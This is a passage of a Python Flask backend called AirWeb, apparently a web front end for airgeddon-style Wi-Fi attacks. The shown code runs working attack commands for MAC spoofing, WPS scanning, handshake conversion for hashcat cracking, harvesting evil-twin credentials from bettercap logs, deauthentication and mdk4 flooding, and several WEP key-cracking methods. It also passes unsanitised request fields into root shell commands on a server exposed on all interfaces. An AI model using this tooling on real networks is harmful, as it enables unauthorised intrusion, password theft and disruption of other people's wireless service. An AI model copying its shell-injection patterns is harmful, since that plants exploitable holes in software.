    if driver_o: lines += ["=== Driver ==="]      + [l for l in driver_o.splitlines() if l.strip()]
    if bands_out:lines += ["=== Bands/Channels ==="] + [l for l in bands_out.splitlines() if l.strip()]
    if caps_out: lines += ["=== Capabilities ==="] + [l for l in caps_out.splitlines() if l.strip()]
    lines += [f"=== Monitor support: {'YES' if support_mon.strip()!='0' else 'NO'} ==="]
    lines += [f"=== Packet inject : {'YES' if support_inj.strip()!='0' else 'NO'} ==="]
    full_output = "\n".join(lines)
    return jsonify({
        "iw_info":     iw_out,
        "mac":         mac_out.strip(),
        "tx_power":    tx_out,
        "bands":       bands_out,
        "caps":        caps_out,
        "full_output": full_output,
        "iw_phy":      full_output,
        "output":      full_output,
    })

# Interface: set TX power
@app.route("/api/iface/txpower", methods=["POST"])
def set_txpower():
    data  = request.json or {}
    iface = data.get("interface") or get_active_iface()
    level = data.get("level", "30")  # dBm
    out1, _, _ = run_cmd(f"iw dev {iface} set txpower fixed {int(level)*100} 2>&1 || iwconfig {iface} txpower {level} 2>&1")
    return jsonify({"output": out1, "success": f"TX power set to {level} dBm"})

# Interface: channel hop
@app.route("/api/iface/chanhop", methods=["POST"])
def chan_hop():
    data   = request.json or {}
    iface  = data.get("interface") or get_active_iface()
    chans  = data.get("channels", list(range(1, 15)))
    dwell  = float(data.get("dwell", 0.5))
    state["chanhop_running"] = True
    def _hop():
        while state.get("chanhop_running"):
            for ch in chans:
                if not state.get("chanhop_running"): break
                run_cmd(f"iw dev {iface} set channel {ch} 2>/dev/null || iwconfig {iface} channel {ch} 2>/dev/null")
                time.sleep(dwell)
    threading.Thread(target=_hop, daemon=True).start()
    return jsonify({"success": f"Channel hopping started on {iface}"})

@app.route("/api/iface/chanhop/stop", methods=["POST"])
def chan_hop_stop():
    state["chanhop_running"] = False
    return jsonify({"success": "Channel hopping stopped"})

# Interface: MAC spoof
@app.route("/api/iface/macspoof", methods=["POST"])
def mac_spoof():
    data  = request.json or {}
    iface = data.get("interface") or get_active_iface()
    mac   = data.get("mac", "random")
    if mac == "random":
        import random
        mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
    out, _, rc = run_cmd(f"ip link set {iface} down && ip link set {iface} address {mac} && ip link set {iface} up 2>&1")
    return jsonify({"output": out, "mac": mac, "success": f"MAC changed to {mac}" if rc == 0 else None,
                    "error": out if rc != 0 else None})

# Scanner: WPS scan with wash
@app.route("/api/scan/wps", methods=["POST"])
def scan_wps():
    data  = request.json or {}
    iface = get_active_iface()
    time_ = int(data.get("time", 15))
    if not iface:
        return jsonify({"error": "No monitor interface — enable monitor mode first"})
    if not tool_exists("wash"):
        return jsonify({"error": "wash not installed — run: apt install reaver"})

    out_file = TMPDIR + "wash_out.txt"
    # Clear old output
    try: os.remove(out_file)
    except: pass

    # wash needs the interface in monitor mode; run with -s for passive scan
    # -C = ignore FCS errors (more results on some drivers)
    cmd = f"wash -i {iface} -s -C -o {out_file} 2>&1"
    proc = run_bg("wash", cmd)

    # Check it started OK
    time.sleep(1.5)
    running = proc.poll() is None
    if not running:
        try: err = proc.stdout.read(400)
        except: err = ""
        # Fallback: wash without -C flag (older versions)
        cmd2 = f"wash -i {iface} -s -o {out_file} 2>&1"
        proc = run_bg("wash", cmd2)
        time.sleep(1)
        running = proc.poll() is None
        if not running:
            return jsonify({"error": f"wash failed to start: {err or 'check interface and permissions'}"})

    # Block for the scan duration (up to time_ seconds)
    deadline = time.time() + time_
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        time.sleep(0.5)
    kill_bg("wash")
    time.sleep(0.3)

    stdout, _, _ = run_cmd(f"cat '{out_file}' 2>/dev/null")

    # Parse wash output — handles both old and new wash column formats
    # Old format: BSSID CH dBm WPS Lck ESSID
    # New format: BSSID CH dBm WPS Lck Vendor ESSID
    wps_nets = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID") or line.startswith("-") or line.startswith("["):
            continue
        parts = line.split()
        if len(parts) >= 5 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", parts[0]):
            locked_raw = parts[4] if len(parts) > 4 else "?"
            locked = "1" if locked_raw.lower() in ("yes", "1", "true", "locked") else "0"
            essid_start = 6 if len(parts) > 6 else 5
            essid = " ".join(parts[essid_start:]).strip() if len(parts) > essid_start else ""
            wps_nets.append({
                "bssid":      parts[0],
                "channel":    parts[1],
                "rssi":       parts[2],
                "wps_version":parts[3] if len(parts) > 3 else "?",
                "wps_locked": locked,
                "essid":      essid,
            })

    state["wps_scan_results"] = wps_nets
    return jsonify({"output": stdout, "networks": wps_nets, "count": len(wps_nets)})


@app.route("/api/scan/wps/stop", methods=["POST"])
def scan_wps_stop():
    kill_bg("wash")
    return jsonify({"success": "WPS scan stopped"})

# Handshake: streaming status with deauth log
@app.route("/api/handshake/log")
def handshake_log():
    return jsonify({
        "running":    state.get("handshake_running", False),
        "found":      state.get("handshake_found", False),
        "result":     state.get("handshake_result", "idle"),
        "cap_file":   state.get("last_cap_file", ""),
        "log_lines":  state.get("hs_log", []),
        "deauth_log": state.get("deauth_log", []),
    })

# Crack: convert cap to hccapx for hashcat
@app.route("/api/crack/convert", methods=["POST"])
def crack_convert():
    data    = request.json or {}
    capfile = (data.get("capfile") or "").strip() or state.get("last_cap_file", "")
    if not capfile or not os.path.exists(capfile):
        available = sorted([os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        hint = "Available: " + ", ".join(available) if available else "No caps in " + TMPDIR
        return jsonify({"error": f"Cap file not found: {capfile}. {hint}"})

    output_lines = [f"[*] Input: {capfile}  ({os.path.getsize(capfile)} bytes)"]

    # Check for handshake first
    chk, _, _ = run_cmd(f"aircrack-ng '{capfile}' 2>&1 | head -20")
    has_hs = bool(re.search(r"[1-9]\d* handshake", chk, re.IGNORECASE))
    output_lines.append(f"[*] Handshake check: {'FOUND' if has_hs else 'NOT FOUND'}")

    # Try cap2hccapx (WPA legacy format)
    outfile_hccapx = capfile.replace(".cap", ".hccapx")
    out1, e1, rc1 = run_cmd(f"cap2hccapx '{capfile}' '{outfile_hccapx}' 2>&1")
    cap2_ok = rc1 == 0 and os.path.exists(outfile_hccapx) and os.path.getsize(outfile_hccapx) > 0
    output_lines.append(f"[cap2hccapx] {'OK → ' + outfile_hccapx if cap2_ok else 'Failed or not installed'}")

    # Try hcxpcapngtool (PMKID + WPA, mode 22000)
    outfile_22000 = capfile.replace(".cap", "_22000.txt")
    out2, e2, rc2 = run_cmd(f"hcxpcapngtool -o '{outfile_22000}' '{capfile}' 2>&1")
    hcx_ok = rc2 == 0 and os.path.exists(outfile_22000) and os.path.getsize(outfile_22000) > 0
    no_hash = "no hashes written" in out2.lower()
    output_lines.append(f"[hcxpcapngtool] {'OK → ' + outfile_22000 if hcx_ok else ('No hashes written' if no_hash else 'Failed')}")

    # Detailed reason if nothing worked
    if not cap2_ok and not hcx_ok:
        reasons = []
        if "radiotap" in out2.lower():       reasons.append("Missing radiotap headers — use pcap+csv format during capture")
        if "eapol" in out2.lower() or "no hashes" in out2.lower():
            reasons.append("No EAPOL/handshake frames — the cap has no crackable data")
        if "authentication" in out2.lower(): reasons.append("Missing auth frames — capture was too short")
        if not has_hs: reasons.append("No complete 4-way handshake in this file")
        if not reasons: reasons.append("File may only contain beacon frames")
        output_lines += [f"[!] Reason: {r}" for r in reasons]
        output_lines.append("[*] TIP: Capture longer, send deauth, wait for client reconnect")
        return jsonify({
            "output": "\n".join(output_lines),
            "error": "Conversion failed: " + " | ".join(reasons),
        })

    result_file = outfile_22000 if hcx_ok else outfile_hccapx
    return jsonify({
        "success": f"Converted → {result_file}",
        "outfile": result_file,
        "outfile_hccapx": outfile_hccapx if cap2_ok else None,
        "outfile_22000":  outfile_22000 if hcx_ok else None,
        "output": "\n".join(output_lines),
    })


# Crack: wordlist manager
@app.route("/api/wordlists")
def list_wordlists():
    common_paths = [
        "/usr/share/wordlists",
        "/usr/share/wordlists/rockyou.txt",
        "/opt/wordlists",
        TMPDIR,
    ]
    found = []
    for p in common_paths:
        if os.path.isfile(p):
            found.append({"path": p, "size": os.path.getsize(p), "lines": "?"})
        elif os.path.isdir(p):
            for f in os.listdir(p):
                fp = os.path.join(p, f)
                if os.path.isfile(fp) and (f.endswith(".txt") or f.endswith(".lst") or f.endswith(".gz")):
                    found.append({"path": fp, "size": os.path.getsize(fp), "lines": "?"})
    return jsonify({"wordlists": found})

# Evil twin: get captured credentials live
@app.route("/api/eviltwin/creds")
def eviltwin_creds():
    # Read bettercap or ettercap log
    creds = list(state.get("eviltwin_credentials", []))
    log_file = TMPDIR + "ag.bettercap.log"
    if os.path.exists(log_file):
        try:
            with open(log_file) as f:
                for line in f:
                    if "password" in line.lower() or "pass" in line.lower():
                        creds.append({"time": "?", "type": "HTTP", "user": "?", "password": line.strip()})
        except: pass
    return jsonify({"credentials": creds, "count": len(creds)})

# DoS: track running attacks
@app.route("/api/dos/status")
def dos_status():
    running = {}
    for key in ["deauth", "mdk4_beacon", "mdk4_deauth_amok", "mdk4_auth", "mdk4_wids", "mdk4_michael"]:
        proc = state["active_processes"].get(key)
        running[key] = proc is not None and proc.poll() is None
    return jsonify({"running": running, "any_active": any(running.values())})

# ── WEP ATTACKS ──────────────────────────────────────────────────────────────
# Based on airgeddon WEP attack suite

@app.route("/api/wep/attack", methods=["POST"])
def wep_attack():
    data       = request.json or {}
    mode       = data.get("mode", "arp")
    bssid      = (data.get("bssid") or "").strip()
    channel    = (data.get("channel") or "").strip()
    client     = (data.get("client") or "").strip()
    essid      = (data.get("essid") or "").strip()
    output     = data.get("output", TMPDIR + "wep_arp")
    iface      = get_active_iface()

    if not iface:
        return jsonify({"error": "No monitor interface active — enable monitor mode first"})

    log = []

    if mode == "fakeauth":
        if not bssid:
            return jsonify({"error": "BSSID required for fake auth"})
        delay = data.get("fa_delay", "0")
        keep  = data.get("fa_keep", "10")
        essid_flag = f"-e '{essid}'" if essid else ""
        cmd = f"aireplay-ng -1 {delay} -o 1 -q {keep} -a {bssid} {essid_flag} {iface}"
        proc = run_bg("wep_fakeauth", cmd)
        log.append(f"[*] Fake auth: {cmd}")
        time.sleep(2)
        running = proc.poll() is None
        out = ""
        try:
            import select as _sel
            ready, _, _ = _sel.select([proc.stdout], [], [], 2)
            if ready:
                for _ in range(6):
                    line = proc.stdout.readline()
                    if not line: break
                    out += line
        except: pass
        log.append(out or ("Running..." if running else "Exited"))
        return jsonify({"output": "\n".join(log), "success": "Fake auth running" if running else None,
                        "error": None if running else "Fake auth failed — check BSSID/interface"})

    elif mode == "arp":
        if not bssid:
            return jsonify({"error": "BSSID required for ARP replay"})
        client_flag = f"-h {client}" if client else ""
        # Start capture in background
        run_cmd(f"iwconfig {iface} channel {channel} 2>/dev/null; iw dev {iface} set channel {channel} 2>/dev/null; true")
        cap_cmd = f"airodump-ng --bssid {bssid} --channel {channel} -w {output} --output-format pcap {iface}"
        run_bg("wep_cap", cap_cmd)
        time.sleep(1)
        # Start ARP replay
        arp_cmd = f"aireplay-ng -3 -b {bssid} {client_flag} {iface}"
        run_bg("wep_arp", arp_cmd)
        log = [f"[*] Capture: {output}-01.cap", f"[*] ARP replay started against {bssid}",
               "[*] Wait for 50,000+ IVs then use Crack WEP tab"]
        return jsonify({"output": "\n".join(log), "success": "ARP replay + capture running", "cap_file": output+"-01.cap"})

    elif mode == "frag":
        if not bssid:
            return jsonify({"error": "BSSID required"})
        client_flag = f"-h {client}" if client else ""
        cmd = f"aireplay-ng -5 -b {bssid} {client_flag} {iface}"
        proc = run_bg("wep_frag", cmd)
        log.append(f"[*] Fragmentation: {cmd}")
        out = read_output(proc, timeout=30)
        log.append(out)
        return jsonify({"output": "\n".join(log)})

    elif mode == "chopchop":
        if not bssid:
            return jsonify({"error": "BSSID required"})
        client_flag = f"-h {client}" if client else ""
        cmd = f"aireplay-ng -4 -b {bssid} {client_flag} {iface}"
        proc = run_bg("wep_chopchop", cmd)
        log.append(f"[*] ChopChop: {cmd}")
        out = read_output(proc, timeout=30)
        log.append(out)
        return jsonify({"output": "\n".join(log)})

    elif mode == "caffe":
        if not client:
            return jsonify({"error": "Client MAC required for Caffe Latte (target must be probing)"})
        cmd = f"aireplay-ng -6 -D -b {bssid or 'FF:FF:FF:FF:FF:FF'} -h {client} {iface}"
        proc = run_bg("wep_caffe", cmd)
        log.append(f"[*] Caffe Latte: {cmd}")
        out = read_output(proc, timeout=15)
        log.append(out or "Running...")
        return jsonify({"output": "\n".join(log), "success": "Caffe Latte running"})

    elif mode == "hirte":
        if not client:
            return jsonify({"error": "Client MAC required for Hirte attack"})
        cmd = f"aireplay-ng -8 -d {client} {iface}"
        proc = run_bg("wep_hirte", cmd)
        log.append(f"[*] Hirte: {cmd}")
        out = read_output(proc, timeout=15)
        log.append(out or "Running...")
        return jsonify({"output": "\n".join(log), "success": "Hirte attack running"})

    elif mode == "besside":
        if not tool_exists("besside-ng"):
            return jsonify({"error": "besside-ng not installed (part of aircrack-ng suite)"})
        target_flag = f"-b {data.get('besside_target','')}" if data.get("besside_target") else ""
        cmd = f"besside-ng {target_flag} -c {channel} {iface}" if channel else f"besside-ng {target_flag} {iface}"
        proc = run_bg("wep_besside", cmd)
        log = [f"[*] Besside-ng: {cmd}", f"[*] Log: /tmp/airweb/wep-besside.log",
               "[*] Besside-ng scans all channels for WEP networks and cracks automatically"]
        return jsonify({"output": "\n".join(log), "success": "Besside-ng running"})

    return jsonify({"error": f"Unknown WEP mode: {mode}"})


@app.route("/api/wep/stop", methods=["POST"])
def wep_stop():
    data = request.json or {}
    mode = data.get("mode", "all")
    key_map = {"arp": ["wep_arp", "wep_cap"], "fakeauth": ["wep_fakeauth"],
               "frag": ["wep_frag"], "chopchop": ["wep_chopchop"],
               "caffe": ["wep_caffe"], "hirte": ["wep_hirte"], "besside": ["wep_besside"]}
    if mode == "all":
        for keys in key_map.values():
            for k in keys: kill_bg(k)
    else:
        for k in key_map.get(mode, [mode]): kill_bg(k)
    return jsonify({"success": f"WEP {mode} stopped"})


@app.route("/api/wep/crack", methods=["POST"])
def wep_crack():
    data    = request.json or {}
    capfile = (data.get("capfile") or "").strip()
    mode    = data.get("mode", "")  # "" = PTW,  "-K" = FMS+KoreK
    if not capfile or not os.path.exists(capfile):
        available = sorted([os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        hint = "Available: " + ", ".join(available) if available else "No cap files"
        return jsonify({"error": f"Cap not found: {capfile}. {hint}"})
    cmd = f"aircrack-ng {mode} '{capfile}' 2>&1"
    proc = run_bg("aircrack_wep", cmd)
    output = read_output(proc, timeout=180)
    output = re.sub(r"\x1b\[[0-9;]*m|\[\d+K", "", output)
    key_m = re.search(r"KEY FOUND!.*?\[\s*(.+?)\s*\]", output)
    hex_m  = re.search(r"KEY FOUND!.*?\((.+?)\)", output)
    return jsonify({
        "output":  output,
        "key":     key_m.group(1) if key_m else None,
        "key_hex": hex_m.group(1) if hex_m else None,
        "success": f"WEP KEY FOUND: {key_m.group(1)}" if key_m else None,
        "error":   None if key_m else "Not enough IVs yet — keep capturing (need 50k–150k IVs)",
    })


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("\n⚠  WARNING: AirWeb must be run as root for wireless tools to work.")
        print("   Run: sudo python3 server.py\n")

    # Check Flask
    try:
        from flask_cors import CORS
    except ImportError:
        print("Installing flask and flask-cors...")
        os.system("pip3 install flask flask-cors --break-system-packages -q")
        from flask_cors import CORS
        CORS(app)

    print("""
╔══════════════════════════════════════╗
║   AirWeb - WiFi Security Backend     ║
║   Based on airgeddon by v1s1t0r      ║
║   Running on http://localhost:5000   ║
╚══════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
